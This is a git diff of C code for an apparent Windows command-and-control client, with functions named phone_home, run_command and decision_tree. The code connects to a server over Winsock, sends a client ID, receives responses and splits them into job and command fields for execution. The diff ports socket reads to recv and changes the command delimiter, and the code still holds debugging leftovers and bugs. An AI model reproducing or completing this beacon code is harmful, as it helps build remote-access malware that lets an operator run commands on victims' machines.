@@ -19,7 +19,7 @@ char* run_command(char* command);
 int send_message(int sock, char *response);
 char * phone_home();
 char * client_id_generate();
-char * decision_tree(int sock);
+char * decision_tree(SOCKET sock, WSADATA wsa);
 size_t decode_utf8(const char* utf8_str, char* decoded_str);
 
 //structs for the win... makes life easy :)
@@ -92,8 +92,10 @@ char* phone_home(char* client_id) {
     SOCKET sock = INVALID_SOCKET;
     struct sockaddr_in serv_addr;
     char* hello = "Hello from client";
-    char buffer[1024] = {0};
-    int valread;
+
+    //char buffer[1024] = {0};
+    //int result = WSAStartup(MAKEWORD(2, 2), &wsa);
+
 
     printf("Process ID: %d\n", GetCurrentProcessId());
 
@@ -135,8 +137,8 @@ char* phone_home(char* client_id) {
     }*/
 
     else {
-        printf("Running decision tree.");
-        decision_tree(sock);
+        printf("Running decision tree.\n");
+        decision_tree(sock, wsa);
     }
     
     
@@ -152,25 +154,25 @@ and that's why they are random as FUCK
 /* Del up to here for windows, then copy paste over*/
 
 //need to get proper variables passed here, atm the loop workds, but this is not set up yet
-char * decision_tree(int sock) {
+char * decision_tree(SOCKET sock, WSADATA wsa) {
+    int result = WSAStartup(MAKEWORD(2, 2), &wsa);
     char buffer[1024] = {0};
-    int valread;
+
     //printf("server first connection: %i\n", server_connection.first_connection);
 
     //sending client_id
     send_message(sock, server_connection.client_id);
     printf("waiting on server response=======\n");
 
+    printf("Sock Value: %i\n", sock);
 
-    valread = read(sock, buffer, 1024);
+    result = recv(sock, buffer, sizeof(buffer), 0);
     printf("Response current Buffer: %s\n", buffer);
 
-    if (valread = -1 ) {
-        perror("Valread Error");
+    if (result == -1 ) {
+        perror("WSA result Error");
+        //return -1;
     }
-
-    /* valread is gicing a -1, which means there's an error somewhere*/
-    printf("Response current Valread: %i\n", valread);
 
     /* turning buffer into newbuffer (aka a char array)*/
     int len = strlen(buffer); // get the length of the string
@@ -288,7 +290,7 @@ job string_splitter(char * string_to_split) {
     new_job.job = malloc(100); // allocate memory for job field
     new_job.command = malloc(1000); // allocate memory for command field
     char * pch;
-    pch = strtok (string_to_split," ");
+    pch = strtok (string_to_split,"\\|/");
     int i = 0;
     while (pch != NULL)
     {
@@ -298,11 +300,13 @@ job string_splitter(char * string_to_split) {
         if (i == 1) {
             new_job.command = pch;
         }
-        pch = strtok (NULL, " ");
+        pch = strtok (NULL, "\\|/");
+        //adding one to the count
         i++;
     }
     
-    printf("new job %s ", new_job.job);
+    printf("new job %s \n:", new_job.job);
+    printf("new_job command %s\n :", new_job.command);
     return new_job;
 }
 
